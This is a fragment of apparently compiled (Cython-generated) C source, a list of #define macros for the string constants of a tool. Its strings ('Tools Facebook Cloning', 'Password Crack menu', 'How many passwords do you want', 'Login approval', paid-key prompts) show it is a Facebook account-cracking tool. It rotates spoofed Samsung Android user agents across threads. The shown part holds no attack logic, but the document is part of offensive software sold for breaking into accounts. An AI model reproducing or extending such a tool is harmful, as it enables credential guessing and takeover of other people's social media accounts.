#define __pyx_kp_s_GT_P7300 __pyx_mstate_global->__pyx_kp_s_GT_P7300
#define __pyx_kp_s_GT_P7300B __pyx_mstate_global->__pyx_kp_s_GT_P7300B
#define __pyx_kp_s_GT_P7310 __pyx_mstate_global->__pyx_kp_s_GT_P7310
#define __pyx_kp_s_GT_P7320 __pyx_mstate_global->__pyx_kp_s_GT_P7320
#define __pyx_kp_s_GT_P7500D __pyx_mstate_global->__pyx_kp_s_GT_P7500D
#define __pyx_kp_s_GT_P7500M __pyx_mstate_global->__pyx_kp_s_GT_P7500M
#define __pyx_kp_s_GT_P7500R __pyx_mstate_global->__pyx_kp_s_GT_P7500R
#define __pyx_kp_s_GT_P7500V __pyx_mstate_global->__pyx_kp_s_GT_P7500V
#define __pyx_kp_s_GT_P7501 __pyx_mstate_global->__pyx_kp_s_GT_P7501
#define __pyx_kp_s_GT_P7511 __pyx_mstate_global->__pyx_kp_s_GT_P7511
#define __pyx_kp_s_GT_S3330 __pyx_mstate_global->__pyx_kp_s_GT_S3330
#define __pyx_kp_s_GT_S3332 __pyx_mstate_global->__pyx_kp_s_GT_S3332
#define __pyx_kp_s_GT_S3333 __pyx_mstate_global->__pyx_kp_s_GT_S3333
#define __pyx_kp_s_GT_S3370 __pyx_mstate_global->__pyx_kp_s_GT_S3370
#define __pyx_kp_s_GT_S3518 __pyx_mstate_global->__pyx_kp_s_GT_S3518
#define __pyx_kp_s_GT_S3570 __pyx_mstate_global->__pyx_kp_s_GT_S3570
#define __pyx_kp_s_GT_S3600i __pyx_mstate_global->__pyx_kp_s_GT_S3600i
#define __pyx_kp_s_GT_S3650 __pyx_mstate_global->__pyx_kp_s_GT_S3650
#define __pyx_kp_s_GT_S3653W __pyx_mstate_global->__pyx_kp_s_GT_S3653W
#define __pyx_kp_s_GT_S3770K __pyx_mstate_global->__pyx_kp_s_GT_S3770K
#define __pyx_kp_s_GT_S3770M __pyx_mstate_global->__pyx_kp_s_GT_S3770M
#define __pyx_kp_s_GT_S3800W __pyx_mstate_global->__pyx_kp_s_GT_S3800W
#define __pyx_kp_s_GT_S3802 __pyx_mstate_global->__pyx_kp_s_GT_S3802
#define __pyx_kp_s_GT_S3850 __pyx_mstate_global->__pyx_kp_s_GT_S3850
#define __pyx_kp_s_GT_S5220 __pyx_mstate_global->__pyx_kp_s_GT_S5220
#define __pyx_kp_s_GT_S5220R __pyx_mstate_global->__pyx_kp_s_GT_S5220R
#define __pyx_kp_s_GT_S5222 __pyx_mstate_global->__pyx_kp_s_GT_S5222
#define __pyx_kp_s_GT_S5230 __pyx_mstate_global->__pyx_kp_s_GT_S5230
#define __pyx_kp_s_GT_S5230W __pyx_mstate_global->__pyx_kp_s_GT_S5230W
#define __pyx_kp_s_GT_S5233T __pyx_mstate_global->__pyx_kp_s_GT_S5233T
#define __pyx_kp_s_GT_S5250 __pyx_mstate_global->__pyx_kp_s_GT_S5250
#define __pyx_kp_s_GT_S5253 __pyx_mstate_global->__pyx_kp_s_GT_S5253
#define __pyx_kp_s_GT_S5280 __pyx_mstate_global->__pyx_kp_s_GT_S5280
#define __pyx_kp_s_GT_S5282 __pyx_mstate_global->__pyx_kp_s_GT_S5282
#define __pyx_kp_s_GT_S5283B __pyx_mstate_global->__pyx_kp_s_GT_S5283B
#define __pyx_kp_s_GT_S5292 __pyx_mstate_global->__pyx_kp_s_GT_S5292
#define __pyx_kp_s_GT_S5300 __pyx_mstate_global->__pyx_kp_s_GT_S5300
#define __pyx_kp_s_GT_S5300L __pyx_mstate_global->__pyx_kp_s_GT_S5300L
#define __pyx_kp_s_GT_S5301 __pyx_mstate_global->__pyx_kp_s_GT_S5301
#define __pyx_kp_s_GT_S5301B __pyx_mstate_global->__pyx_kp_s_GT_S5301B
#define __pyx_kp_s_GT_S5301L __pyx_mstate_global->__pyx_kp_s_GT_S5301L
#define __pyx_kp_s_GT_S5302 __pyx_mstate_global->__pyx_kp_s_GT_S5302
#define __pyx_kp_s_GT_S5302B __pyx_mstate_global->__pyx_kp_s_GT_S5302B
#define __pyx_kp_s_GT_S5303 __pyx_mstate_global->__pyx_kp_s_GT_S5303
#define __pyx_kp_s_GT_S5303B __pyx_mstate_global->__pyx_kp_s_GT_S5303B
#define __pyx_kp_s_GT_S5310 __pyx_mstate_global->__pyx_kp_s_GT_S5310
#define __pyx_kp_s_GT_S5310B __pyx_mstate_global->__pyx_kp_s_GT_S5310B
#define __pyx_kp_s_GT_S5310C __pyx_mstate_global->__pyx_kp_s_GT_S5310C
#define __pyx_kp_s_GT_S5310E __pyx_mstate_global->__pyx_kp_s_GT_S5310E
#define __pyx_kp_s_GT_S5310G __pyx_mstate_global->__pyx_kp_s_GT_S5310G
#define __pyx_kp_s_GT_S5310I __pyx_mstate_global->__pyx_kp_s_GT_S5310I
#define __pyx_kp_s_GT_S5310L __pyx_mstate_global->__pyx_kp_s_GT_S5310L
#define __pyx_kp_s_GT_S5310M __pyx_mstate_global->__pyx_kp_s_GT_S5310M
#define __pyx_kp_s_GT_S5310N __pyx_mstate_global->__pyx_kp_s_GT_S5310N
#define __pyx_kp_s_GT_S5312 __pyx_mstate_global->__pyx_kp_s_GT_S5312
#define __pyx_kp_s_GT_S5312B __pyx_mstate_global->__pyx_kp_s_GT_S5312B
#define __pyx_kp_s_GT_S5312C __pyx_mstate_global->__pyx_kp_s_GT_S5312C
#define __pyx_kp_s_GT_S5312L __pyx_mstate_global->__pyx_kp_s_GT_S5312L
#define __pyx_kp_s_GT_S5330 __pyx_mstate_global->__pyx_kp_s_GT_S5330
#define __pyx_kp_s_GT_S5360 __pyx_mstate_global->__pyx_kp_s_GT_S5360
#define __pyx_kp_s_GT_S5360B __pyx_mstate_global->__pyx_kp_s_GT_S5360B
#define __pyx_kp_s_GT_S5360L __pyx_mstate_global->__pyx_kp_s_GT_S5360L
#define __pyx_kp_s_GT_S5360T __pyx_mstate_global->__pyx_kp_s_GT_S5360T
#define __pyx_kp_s_GT_S5363 __pyx_mstate_global->__pyx_kp_s_GT_S5363
#define __pyx_kp_s_GT_S5367 __pyx_mstate_global->__pyx_kp_s_GT_S5367
#define __pyx_kp_s_GT_S5369 __pyx_mstate_global->__pyx_kp_s_GT_S5369
#define __pyx_kp_s_GT_S5380 __pyx_mstate_global->__pyx_kp_s_GT_S5380
#define __pyx_kp_s_GT_S5380D __pyx_mstate_global->__pyx_kp_s_GT_S5380D
#define __pyx_kp_s_GT_S5500 __pyx_mstate_global->__pyx_kp_s_GT_S5500
#define __pyx_kp_s_GT_S5560 __pyx_mstate_global->__pyx_kp_s_GT_S5560
#define __pyx_kp_s_GT_S5560i __pyx_mstate_global->__pyx_kp_s_GT_S5560i
#define __pyx_kp_s_GT_S5570B __pyx_mstate_global->__pyx_kp_s_GT_S5570B
#define __pyx_kp_s_GT_S5570I __pyx_mstate_global->__pyx_kp_s_GT_S5570I
#define __pyx_kp_s_GT_S5570L __pyx_mstate_global->__pyx_kp_s_GT_S5570L
#define __pyx_kp_s_GT_S5578 __pyx_mstate_global->__pyx_kp_s_GT_S5578
#define __pyx_kp_s_GT_S5600 __pyx_mstate_global->__pyx_kp_s_GT_S5600
#define __pyx_kp_s_GT_S5603 __pyx_mstate_global->__pyx_kp_s_GT_S5603
#define __pyx_kp_s_GT_S5610 __pyx_mstate_global->__pyx_kp_s_GT_S5610
#define __pyx_kp_s_GT_S5610K __pyx_mstate_global->__pyx_kp_s_GT_S5610K
#define __pyx_kp_s_GT_S5611 __pyx_mstate_global->__pyx_kp_s_GT_S5611
#define __pyx_kp_s_GT_S5620 __pyx_mstate_global->__pyx_kp_s_GT_S5620
#define __pyx_kp_s_GT_S5670 __pyx_mstate_global->__pyx_kp_s_GT_S5670
#define __pyx_kp_s_GT_S5670B __pyx_mstate_global->__pyx_kp_s_GT_S5670B
#define __pyx_kp_s_GT_S5670HKBZTA __pyx_mstate_global->__pyx_kp_s_GT_S5670HKBZTA
#define __pyx_kp_s_GT_S5690 __pyx_mstate_global->__pyx_kp_s_GT_S5690
#define __pyx_kp_s_GT_S5690R __pyx_mstate_global->__pyx_kp_s_GT_S5690R
#define __pyx_kp_s_GT_S5830 __pyx_mstate_global->__pyx_kp_s_GT_S5830
#define __pyx_kp_s_GT_S5830D __pyx_mstate_global->__pyx_kp_s_GT_S5830D
#define __pyx_kp_s_GT_S5830G __pyx_mstate_global->__pyx_kp_s_GT_S5830G
#define __pyx_kp_s_GT_S5830L __pyx_mstate_global->__pyx_kp_s_GT_S5830L
#define __pyx_kp_s_GT_S5830M __pyx_mstate_global->__pyx_kp_s_GT_S5830M
#define __pyx_kp_s_GT_S5830T __pyx_mstate_global->__pyx_kp_s_GT_S5830T
#define __pyx_kp_s_GT_S5830V __pyx_mstate_global->__pyx_kp_s_GT_S5830V
#define __pyx_kp_s_GT_S5830i __pyx_mstate_global->__pyx_kp_s_GT_S5830i
#define __pyx_kp_s_GT_S5831i __pyx_mstate_global->__pyx_kp_s_GT_S5831i
#define __pyx_kp_s_GT_S5838 __pyx_mstate_global->__pyx_kp_s_GT_S5838
#define __pyx_kp_s_GT_S5839i __pyx_mstate_global->__pyx_kp_s_GT_S5839i
#define __pyx_kp_s_GT_S6010 __pyx_mstate_global->__pyx_kp_s_GT_S6010
#define __pyx_kp_s_GT_S6010BBABTU __pyx_mstate_global->__pyx_kp_s_GT_S6010BBABTU
#define __pyx_kp_s_GT_S6012 __pyx_mstate_global->__pyx_kp_s_GT_S6012
#define __pyx_kp_s_GT_S6012B __pyx_mstate_global->__pyx_kp_s_GT_S6012B
#define __pyx_kp_s_GT_S6102 __pyx_mstate_global->__pyx_kp_s_GT_S6102
#define __pyx_kp_s_GT_S6102B __pyx_mstate_global->__pyx_kp_s_GT_S6102B
#define __pyx_kp_s_GT_S6293T __pyx_mstate_global->__pyx_kp_s_GT_S6293T
#define __pyx_kp_s_GT_S6310B __pyx_mstate_global->__pyx_kp_s_GT_S6310B
#define __pyx_kp_s_GT_S6310ZWAMID __pyx_mstate_global->__pyx_kp_s_GT_S6310ZWAMID
#define __pyx_kp_s_GT_S6312 __pyx_mstate_global->__pyx_kp_s_GT_S6312
#define __pyx_kp_s_GT_S6313T __pyx_mstate_global->__pyx_kp_s_GT_S6313T
#define __pyx_kp_s_GT_S6352 __pyx_mstate_global->__pyx_kp_s_GT_S6352
#define __pyx_kp_s_GT_S6500 __pyx_mstate_global->__pyx_kp_s_GT_S6500
#define __pyx_kp_s_GT_S6500D __pyx_mstate_global->__pyx_kp_s_GT_S6500D
#define __pyx_kp_s_GT_S6500L __pyx_mstate_global->__pyx_kp_s_GT_S6500L
#define __pyx_kp_s_GT_S6790 __pyx_mstate_global->__pyx_kp_s_GT_S6790
#define __pyx_kp_s_GT_S6790L __pyx_mstate_global->__pyx_kp_s_GT_S6790L
#define __pyx_kp_s_GT_S6790N __pyx_mstate_global->__pyx_kp_s_GT_S6790N
#define __pyx_kp_s_GT_S6792L __pyx_mstate_global->__pyx_kp_s_GT_S6792L
#define __pyx_kp_s_GT_S6800 __pyx_mstate_global->__pyx_kp_s_GT_S6800
#define __pyx_kp_s_GT_S6800HKAXFA __pyx_mstate_global->__pyx_kp_s_GT_S6800HKAXFA
#define __pyx_kp_s_GT_S6802 __pyx_mstate_global->__pyx_kp_s_GT_S6802
#define __pyx_kp_s_GT_S6810 __pyx_mstate_global->__pyx_kp_s_GT_S6810
#define __pyx_kp_s_GT_S6810B __pyx_mstate_global->__pyx_kp_s_GT_S6810B
#define __pyx_kp_s_GT_S6810E __pyx_mstate_global->__pyx_kp_s_GT_S6810E
#define __pyx_kp_s_GT_S6810L __pyx_mstate_global->__pyx_kp_s_GT_S6810L
#define __pyx_kp_s_GT_S6810M __pyx_mstate_global->__pyx_kp_s_GT_S6810M
#define __pyx_kp_s_GT_S6810MBASER __pyx_mstate_global->__pyx_kp_s_GT_S6810MBASER
#define __pyx_kp_s_GT_S6810P __pyx_mstate_global->__pyx_kp_s_GT_S6810P
#define __pyx_kp_s_GT_S6812 __pyx_mstate_global->__pyx_kp_s_GT_S6812
#define __pyx_kp_s_GT_S6812B __pyx_mstate_global->__pyx_kp_s_GT_S6812B
#define __pyx_kp_s_GT_S6812C __pyx_mstate_global->__pyx_kp_s_GT_S6812C
#define __pyx_kp_s_GT_S6812i __pyx_mstate_global->__pyx_kp_s_GT_S6812i
#define __pyx_kp_s_GT_S6818 __pyx_mstate_global->__pyx_kp_s_GT_S6818
#define __pyx_kp_s_GT_S6818V __pyx_mstate_global->__pyx_kp_s_GT_S6818V
#define __pyx_kp_s_GT_S7230E __pyx_mstate_global->__pyx_kp_s_GT_S7230E
#define __pyx_kp_s_GT_S7233E __pyx_mstate_global->__pyx_kp_s_GT_S7233E
#define __pyx_kp_s_GT_S7250D __pyx_mstate_global->__pyx_kp_s_GT_S7250D
#define __pyx_kp_s_GT_S7262 __pyx_mstate_global->__pyx_kp_s_GT_S7262
#define __pyx_kp_s_GT_S7270 __pyx_mstate_global->__pyx_kp_s_GT_S7270
#define __pyx_kp_s_GT_S7270L __pyx_mstate_global->__pyx_kp_s_GT_S7270L
#define __pyx_kp_s_GT_S7272 __pyx_mstate_global->__pyx_kp_s_GT_S7272
#define __pyx_kp_s_GT_S7272C __pyx_mstate_global->__pyx_kp_s_GT_S7272C
#define __pyx_kp_s_GT_S7273T __pyx_mstate_global->__pyx_kp_s_GT_S7273T
#define __pyx_kp_s_GT_S7278 __pyx_mstate_global->__pyx_kp_s_GT_S7278
#define __pyx_kp_s_GT_S7278U __pyx_mstate_global->__pyx_kp_s_GT_S7278U
#define __pyx_kp_s_GT_S7390 __pyx_mstate_global->__pyx_kp_s_GT_S7390
#define __pyx_kp_s_GT_S7390G __pyx_mstate_global->__pyx_kp_s_GT_S7390G
#define __pyx_kp_s_GT_S7390L __pyx_mstate_global->__pyx_kp_s_GT_S7390L
#define __pyx_kp_s_GT_S7390_JZO54K __pyx_mstate_global->__pyx_kp_s_GT_S7390_JZO54K
#define __pyx_kp_s_GT_S7392 __pyx_mstate_global->__pyx_kp_s_GT_S7392
#define __pyx_kp_s_GT_S7392L __pyx_mstate_global->__pyx_kp_s_GT_S7392L
#define __pyx_kp_s_GT_S7500 __pyx_mstate_global->__pyx_kp_s_GT_S7500
#define __pyx_kp_s_GT_S7500ABABTU __pyx_mstate_global->__pyx_kp_s_GT_S7500ABABTU
#define __pyx_kp_s_GT_S7500ABADBT __pyx_mstate_global->__pyx_kp_s_GT_S7500ABADBT
#define __pyx_kp_s_GT_S7500ABTTLP __pyx_mstate_global->__pyx_kp_s_GT_S7500ABTTLP
#define __pyx_kp_s_GT_S7500CWADBT __pyx_mstate_global->__pyx_kp_s_GT_S7500CWADBT
#define __pyx_kp_s_GT_S7500L __pyx_mstate_global->__pyx_kp_s_GT_S7500L
#define __pyx_kp_s_GT_S7500T __pyx_mstate_global->__pyx_kp_s_GT_S7500T
#define __pyx_kp_s_GT_S7560 __pyx_mstate_global->__pyx_kp_s_GT_S7560
#define __pyx_kp_s_GT_S7560M __pyx_mstate_global->__pyx_kp_s_GT_S7560M
#define __pyx_kp_s_GT_S7562 __pyx_mstate_global->__pyx_kp_s_GT_S7562
#define __pyx_kp_s_GT_S7562C __pyx_mstate_global->__pyx_kp_s_GT_S7562C
#define __pyx_kp_s_GT_S7562L __pyx_mstate_global->__pyx_kp_s_GT_S7562L
#define __pyx_kp_s_GT_S7562i __pyx_mstate_global->__pyx_kp_s_GT_S7562i
#define __pyx_kp_s_GT_S7566 __pyx_mstate_global->__pyx_kp_s_GT_S7566
#define __pyx_kp_s_GT_S7568 __pyx_mstate_global->__pyx_kp_s_GT_S7568
#define __pyx_kp_s_GT_S7568I __pyx_mstate_global->__pyx_kp_s_GT_S7568I
#define __pyx_kp_s_GT_S7572 __pyx_mstate_global->__pyx_kp_s_GT_S7572
#define __pyx_kp_s_GT_S7580E __pyx_mstate_global->__pyx_kp_s_GT_S7580E
#define __pyx_kp_s_GT_S7583T __pyx_mstate_global->__pyx_kp_s_GT_S7583T
#define __pyx_kp_s_GT_S758X __pyx_mstate_global->__pyx_kp_s_GT_S758X
#define __pyx_kp_s_GT_S7592 __pyx_mstate_global->__pyx_kp_s_GT_S7592
#define __pyx_kp_s_GT_S7710 __pyx_mstate_global->__pyx_kp_s_GT_S7710
#define __pyx_kp_s_GT_S7710L __pyx_mstate_global->__pyx_kp_s_GT_S7710L
#define __pyx_kp_s_GT_S7898 __pyx_mstate_global->__pyx_kp_s_GT_S7898
#define __pyx_kp_s_GT_S7898I __pyx_mstate_global->__pyx_kp_s_GT_S7898I
#define __pyx_kp_s_GT_S8500 __pyx_mstate_global->__pyx_kp_s_GT_S8500
#define __pyx_kp_s_GT_S8530 __pyx_mstate_global->__pyx_kp_s_GT_S8530
#define __pyx_kp_s_GT_S8600 __pyx_mstate_global->__pyx_kp_s_GT_S8600
#define __pyx_kp_s_GT_STB919 __pyx_mstate_global->__pyx_kp_s_GT_STB919
#define __pyx_kp_s_GT_T140 __pyx_mstate_global->__pyx_kp_s_GT_T140
#define __pyx_kp_s_GT_T150 __pyx_mstate_global->__pyx_kp_s_GT_T150
#define __pyx_kp_s_GT_V8a __pyx_mstate_global->__pyx_kp_s_GT_V8a
#define __pyx_kp_s_GT_V8i __pyx_mstate_global->__pyx_kp_s_GT_V8i
#define __pyx_kp_s_GT_VC818 __pyx_mstate_global->__pyx_kp_s_GT_VC818
#define __pyx_kp_s_GT_VM919S __pyx_mstate_global->__pyx_kp_s_GT_VM919S
#define __pyx_kp_s_GT_W131 __pyx_mstate_global->__pyx_kp_s_GT_W131
#define __pyx_kp_s_GT_W153 __pyx_mstate_global->__pyx_kp_s_GT_W153
#define __pyx_kp_s_GT_X831 __pyx_mstate_global->__pyx_kp_s_GT_X831
#define __pyx_kp_s_GT_X853 __pyx_mstate_global->__pyx_kp_s_GT_X853
#define __pyx_kp_s_GT_X870 __pyx_mstate_global->__pyx_kp_s_GT_X870
#define __pyx_kp_s_GT_X890 __pyx_mstate_global->__pyx_kp_s_GT_X890
#define __pyx_kp_s_GT_Y8750 __pyx_mstate_global->__pyx_kp_s_GT_Y8750
#define __pyx_kp_s_GT_g900f __pyx_mstate_global->__pyx_kp_s_GT_g900f
#define __pyx_kp_s_GT_i8700 __pyx_mstate_global->__pyx_kp_s_GT_i8700
#define __pyx_kp_s_GT_i9040 __pyx_mstate_global->__pyx_kp_s_GT_i9040
#define __pyx_kp_s_GT_m190 __pyx_mstate_global->__pyx_kp_s_GT_m190
#define __pyx_kp_s_GT_mini __pyx_mstate_global->__pyx_kp_s_GT_mini
#define __pyx_kp_s_GT_s5233w __pyx_mstate_global->__pyx_kp_s_GT_s5233w
#define __pyx_kp_s_GT_s5260 __pyx_mstate_global->__pyx_kp_s_GT_s5260
#define __pyx_kp_s_Getting_gmails __pyx_mstate_global->__pyx_kp_s_Getting_gmails
#define __pyx_n_s_H __pyx_mstate_global->__pyx_n_s_H
#define __pyx_kp_s_Hi_ZEA_Sir_I_Need_To_Buy_Your_Pa __pyx_mstate_global->__pyx_kp_s_Hi_ZEA_Sir_I_Need_To_Buy_Your_Pa
#define __pyx_n_s_Host __pyx_mstate_global->__pyx_n_s_Host
#define __pyx_kp_s_How_many_passwords_do_you_want __pyx_mstate_global->__pyx_kp_s_How_many_passwords_do_you_want
#define __pyx_n_s_I __pyx_mstate_global->__pyx_n_s_I
#define __pyx_n_s_IndexError __pyx_mstate_global->__pyx_n_s_IndexError
#define __pyx_kp_s_Installing_missing_modules __pyx_mstate_global->__pyx_kp_s_Installing_missing_modules
#define __pyx_n_s_J __pyx_mstate_global->__pyx_n_s_J
#define __pyx_n_s_K __pyx_mstate_global->__pyx_n_s_K
#define __pyx_kp_s_Key __pyx_mstate_global->__pyx_kp_s_Key
#define __pyx_n_s_Khan __pyx_mstate_global->__pyx_n_s_Khan
#define __pyx_n_s_L __pyx_mstate_global->__pyx_n_s_L
#define __pyx_n_s_Last __pyx_mstate_global->__pyx_n_s_Last
#define __pyx_n_s_Liger __pyx_mstate_global->__pyx_n_s_Liger
#define __pyx_kp_s_Login_approval __pyx_mstate_global->__pyx_kp_s_Login_approval
#define __pyx_n_s_M __pyx_mstate_global->__pyx_n_s_M
#define __pyx_n_s_Main __pyx_mstate_global->__pyx_n_s_Main
#define __pyx_kp_s_Massage_Your_Key_Not_Registered __pyx_mstate_global->__pyx_kp_s_Massage_Your_Key_Not_Registered
#define __pyx_kp_s_Mobile_Safari_533_1 __pyx_mstate_global->__pyx_kp_s_Mobile_Safari_533_1
#define __pyx_kp_s_Mobile_Safari_537_36 __pyx_mstate_global->__pyx_kp_s_Mobile_Safari_537_36
#define __pyx_n_s_ModuleNotFoundError __pyx_mstate_global->__pyx_n_s_ModuleNotFoundError
#define __pyx_kp_s_Mozilla_5_0_Linux_Android_6_0_1 __pyx_mstate_global->__pyx_kp_s_Mozilla_5_0_Linux_Android_6_0_1
#define __pyx_kp_s_Mozilla_5_0_Linux_U_Android __pyx_mstate_global->__pyx_kp_s_Mozilla_5_0_Linux_U_Android
#define __pyx_n_s_N __pyx_mstate_global->__pyx_n_s_N
#define __pyx_n_s_Name __pyx_mstate_global->__pyx_n_s_Name
#define __pyx_kp_s_No_internet_connection __pyx_mstate_global->__pyx_kp_s_No_internet_connection
#define __pyx_kp_s_Not_A_Brand_v_99_Chromium_v_100 __pyx_mstate_global->__pyx_kp_s_Not_A_Brand_v_99_Chromium_v_100
#define __pyx_n_s_O __pyx_mstate_global->__pyx_n_s_O
#define __pyx_kp_u_OAuth __pyx_mstate_global->__pyx_kp_u_OAuth
#define __pyx_kp_s_Option_not_found_in_menu __pyx_mstate_global->__pyx_kp_s_Option_not_found_in_menu
#define __pyx_n_s_P __pyx_mstate_global->__pyx_n_s_P
#define __pyx_kp_s_Press_enter_to_back __pyx_mstate_global->__pyx_kp_s_Press_enter_to_back
#define __pyx_kp_s_Press_enter_to_back_menu __pyx_mstate_global->__pyx_kp_s_Press_enter_to_back_menu
#define __pyx_kp_s_Put_file_example_sdcard_File_tx __pyx_mstate_global->__pyx_kp_s_Put_file_example_sdcard_File_tx
#define __pyx_kp_s_Put_file_path_1_37m __pyx_mstate_global->__pyx_kp_s_Put_file_path_1_37m
#define __pyx_kp_s_Put_first_name __pyx_mstate_global->__pyx_kp_s_Put_first_name
#define __pyx_kp_s_Put_last_name __pyx_mstate_global->__pyx_kp_s_Put_last_name
#define __pyx_kp_s_Put_limit __pyx_mstate_global->__pyx_kp_s_Put_limit
#define __pyx_kp_u_Put_password __pyx_mstate_global->__pyx_kp_u_Put_password
#define __pyx_n_s_Q __pyx_mstate_global->__pyx_n_s_Q
#define __pyx_n_s_R __pyx_mstate_global->__pyx_n_s_R
#define __pyx_n_s_Random __pyx_mstate_global->__pyx_n_s_Random
#define __pyx_kp_s_Run_python_ZEA_py __pyx_mstate_global->__pyx_kp_s_Run_python_ZEA_py
#define __pyx_n_s_S __pyx_mstate_global->__pyx_n_s_S
#define __pyx_kp_s_SM_A500FU_MMB29M __pyx_mstate_global->__pyx_kp_s_SM_A500FU_MMB29M
#define __pyx_kp_s_SM_A500F_LRX22G __pyx_mstate_global->__pyx_kp_s_SM_A500F_LRX22G
#define __pyx_kp_s_SM_A500F_MMB29M __pyx_mstate_global->__pyx_kp_s_SM_A500F_MMB29M
#define __pyx_kp_s_SM_A500H_MMB29M __pyx_mstate_global->__pyx_kp_s_SM_A500H_MMB29M
#define __pyx_kp_s_SM_G900F_KOT49H __pyx_mstate_global->__pyx_kp_s_SM_G900F_KOT49H
#define __pyx_kp_s_SM_G920F_MMB29K __pyx_mstate_global->__pyx_kp_s_SM_G920F_MMB29K
#define __pyx_kp_s_SM_G920F_NRD90M __pyx_mstate_global->__pyx_kp_s_SM_G920F_NRD90M
#define __pyx_kp_s_SM_G930F_NRD90M __pyx_mstate_global->__pyx_kp_s_SM_G930F_NRD90M
#define __pyx_kp_s_SM_G935F_MMB29K __pyx_mstate_global->__pyx_kp_s_SM_G935F_MMB29K
#define __pyx_kp_s_SM_G935F_NRD90M __pyx_mstate_global->__pyx_kp_s_SM_G935F_NRD90M
#define __pyx_kp_s_SM_G950F_NRD90M __pyx_mstate_global->__pyx_kp_s_SM_G950F_NRD90M
#define __pyx_kp_s_SM_J320FN_LMY47V __pyx_mstate_global->__pyx_kp_s_SM_J320FN_LMY47V
#define __pyx_kp_s_SM_J320F_LMY4 __pyx_mstate_global->__pyx_kp_s_SM_J320F_LMY4
#define __pyx_kp_s_SM_J320F_LMY47V __pyx_mstate_global->__pyx_kp_s_SM_J320F_LMY47V
#define __pyx_kp_s_SM_J320H_LMY47V __pyx_mstate_global->__pyx_kp_s_SM_J320H_LMY47V
#define __pyx_kp_s_SM_J320M_LMY47V __pyx_mstate_global->__pyx_kp_s_SM_J320M_LMY47V
#define __pyx_kp_s_SM_J510FN_MMB29M __pyx_mstate_global->__pyx_kp_s_SM_J510FN_MMB29M
#define __pyx_kp_s_SM_J510FN_NMF2 __pyx_mstate_global->__pyx_kp_s_SM_J510FN_NMF2
#define __pyx_kp_s_SM_J510FN_NMF26X __pyx_mstate_global->__pyx_kp_s_SM_J510FN_NMF26X
#define __pyx_kp_s_SM_J510FN_NMF26X_2 __pyx_mstate_global->__pyx_kp_s_SM_J510FN_NMF26X_2
#define __pyx_kp_s_SM_J701F_NRD90M __pyx_mstate_global->__pyx_kp_s_SM_J701F_NRD90M
#define __pyx_kp_s_SM_J701F_NRD90M_2 __pyx_mstate_global->__pyx_kp_s_SM_J701F_NRD90M_2
#define __pyx_kp_s_SM_T111_JDQ39 __pyx_mstate_global->__pyx_kp_s_SM_T111_JDQ39
#define __pyx_kp_s_SM_T230_KOT49H __pyx_mstate_global->__pyx_kp_s_SM_T230_KOT49H
#define __pyx_kp_s_SM_T231_KOT49H __pyx_mstate_global->__pyx_kp_s_SM_T231_KOT49H
#define __pyx_kp_s_SM_T235_KOT4 __pyx_mstate_global->__pyx_kp_s_SM_T235_KOT4
#define __pyx_kp_s_SM_T310_KOT49H __pyx_mstate_global->__pyx_kp_s_SM_T310_KOT49H
#define __pyx_kp_s_SM_T311_KOT4 __pyx_mstate_global->__pyx_kp_s_SM_T311_KOT4
#define __pyx_kp_s_SM_T311_KOT49H __pyx_mstate_global->__pyx_kp_s_SM_T311_KOT49H
#define __pyx_kp_s_SM_T315_JDQ39 __pyx_mstate_global->__pyx_kp_s_SM_T315_JDQ39
#define __pyx_kp_s_SM_T525_KOT49H __pyx_mstate_global->__pyx_kp_s_SM_T525_KOT49H
#define __pyx_kp_s_SM_T531_KOT49H __pyx_mstate_global->__pyx_kp_s_SM_T531_KOT49H
#define __pyx_kp_s_SM_T531_LRX22G __pyx_mstate_global->__pyx_kp_s_SM_T531_LRX22G
#define __pyx_kp_s_SM_T535_LRX22G __pyx_mstate_global->__pyx_kp_s_SM_T535_LRX22G
#define __pyx_kp_s_SM_T555_LRX22G __pyx_mstate_global->__pyx_kp_s_SM_T555_LRX22G
#define __pyx_kp_s_SM_T561_KTU84P __pyx_mstate_global->__pyx_kp_s_SM_T561_KTU84P
#define __pyx_kp_s_SM_T705_LRX22G __pyx_mstate_global->__pyx_kp_s_SM_T705_LRX22G
#define __pyx_kp_s_SM_T705_LRX22G_2 __pyx_mstate_global->__pyx_kp_s_SM_T705_LRX22G_2
#define __pyx_kp_s_SM_T805_LRX22G __pyx_mstate_global->__pyx_kp_s_SM_T805_LRX22G
#define __pyx_kp_s_SM_T820_NRD90M __pyx_mstate_global->__pyx_kp_s_SM_T820_NRD90M
#define __pyx_kp_s_SPH_L720_KOT49H __pyx_mstate_global->__pyx_kp_s_SPH_L720_KOT49H
#define __pyx_n_s_Sabir __pyx_mstate_global->__pyx_n_s_Sabir
#define __pyx_kp_s_Select_Password_Crack_menu __pyx_mstate_global->__pyx_kp_s_Select_Password_Crack_menu
#define __pyx_n_s_Session __pyx_mstate_global->__pyx_n_s_Session
#define __pyx_kp_s_Status_1_91mTrail_1_37m_1_31m_1 __pyx_mstate_global->__pyx_kp_s_Status_1_91mTrail_1_37m_1_31m_1
#define __pyx_n_s_T __pyx_mstate_global->__pyx_n_s_T
#define __pyx_kp_u_TL_tl __pyx_mstate_global->__pyx_kp_u_TL_tl
#define __pyx_kp_s_Thanks_for_use __pyx_mstate_global->__pyx_kp_s_Thanks_for_use
#define __pyx_kp_s_The_process_has_completed __pyx_mstate_global->__pyx_kp_s_The_process_has_completed
#define __pyx_n_s_ThreadPoolExecutor __pyx_mstate_global->__pyx_n_s_ThreadPoolExecutor
#define __pyx_kp_s_Tools_Facebook_Cloning __pyx_mstate_global->__pyx_kp_s_Tools_Facebook_Cloning
#define __pyx_kp_s_Total_OK_CP_2F __pyx_mstate_global->__pyx_kp_s_Total_OK_CP_2F
#define __pyx_kp_s_Total_account_1_32m __pyx_mstate_global->__pyx_kp_s_Total_account_1_32m
#define __pyx_kp_s_Total_account_1_37m __pyx_mstate_global->__pyx_kp_s_Total_account_1_37m
#define __pyx_kp_s_Total_account_ids_1_32m __pyx_mstate_global->__pyx_kp_s_Total_account_ids_1_32m
#define __pyx_kp_s_Try_method_2_3_for_best_results __pyx_mstate_global->__pyx_kp_s_Try_method_2_3_for_best_results
#define __pyx_n_s_U __pyx_mstate_global->__pyx_n_s_U
#define __pyx_kp_s_User_Agent __pyx_mstate_global->__pyx_kp_s_User_Agent
#define __pyx_n_s_V __pyx_mstate_global->__pyx_n_s_V
#define __pyx_n_s_ValueError __pyx_mstate_global->__pyx_n_s_ValueError
#define __pyx_n_s_W __pyx_mstate_global->__pyx_n_s_W
#define __pyx_n_s_X __pyx_mstate_global->__pyx_n_s_X
